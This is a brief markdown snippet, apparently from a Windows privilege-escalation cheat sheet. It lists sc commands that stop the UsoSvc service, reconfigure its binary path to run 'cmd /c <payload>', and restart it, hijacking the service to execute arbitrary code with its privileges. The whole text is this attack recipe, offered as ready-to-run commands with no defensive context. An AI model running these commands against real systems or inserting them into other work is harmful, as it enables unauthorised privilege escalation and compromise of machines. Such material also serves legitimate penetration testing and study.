# Services

#### Reconfigure service

Requires permissions to change start / stop and modify a service.

```bash
sc qc UsoSvc
sc stop UsoSvc
sc config UsoSvc binPath="cmd /c <payload>"
sc start UsoSvc
```



